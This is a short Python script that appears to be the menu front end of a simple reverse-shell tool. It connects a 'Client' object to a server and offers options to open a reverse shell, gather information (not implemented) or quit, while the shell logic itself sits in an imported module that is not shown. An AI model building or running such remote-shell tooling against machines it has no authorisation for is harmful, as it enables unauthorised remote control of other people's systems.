from ObjetClientTarget import Client

def hello():
    client.connect_to_server()
def run():
    client.reverse_shell_send_command()
    client.quit()
def menu():
    print("\t \t ============ \n \t \t \t MENU\n \t \t ============""")

    print("welcome, what's your choice?")
    print("1. Revers shell \n"
          "2. Get informations \n"
          "3. Quit \n")
    choice = input(">")

    if choice == "1":
        run()
    #if choice == '2':

    if choice =="3":
        client.quit()

client = Client()
hello()


menu()
